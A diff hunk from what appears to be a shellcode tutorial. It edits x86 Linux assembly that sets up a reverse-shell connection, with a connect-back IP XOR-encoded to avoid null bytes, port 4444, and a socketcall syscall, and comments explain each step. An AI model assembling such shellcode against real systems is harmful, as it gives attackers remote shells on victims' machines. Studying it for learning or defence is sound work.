@@ -202,15 +202,15 @@ The newly created socket can be identified by storing the value of EAX into the 
 	push eax
 	push eax 	 ; 8 bytes of padding
 	mov eax, 0xffffffff ; XOR IP address with this hex value (avoid NULL's contained in IP)
-	mov ebx, 0x70ff573f ; hex value of 192.168.0.143 XOR'd with 0xffffffff
+	mov ebx, 0xfeffff80 ; hex value of 127.0.0.1 XOR'd with 0xffffffff
 	xor ebx, eax
-	push ebx         ; IP address 192.168.0.143 is set
+	push ebx         ; IP address 127.0.0.1 is set
 	push word 0x5c11 ; port 4444 is set
 	push word 0x02   ; AF_INET
 	; call socket(domain, type, protocol)
 	xor eax, eax
 	xor ebx, ebx
-	mov ax, 0x167    ; hex value of 359
+	mov ax, 0x66    ; hex value of 102
 	mov bl, 0x02     ; AF_INET
 	mov cl, 0x01     ; SOCK_STREAM
 	int 0x80	 ; call the interrupt to create the socket, execute the syscall		
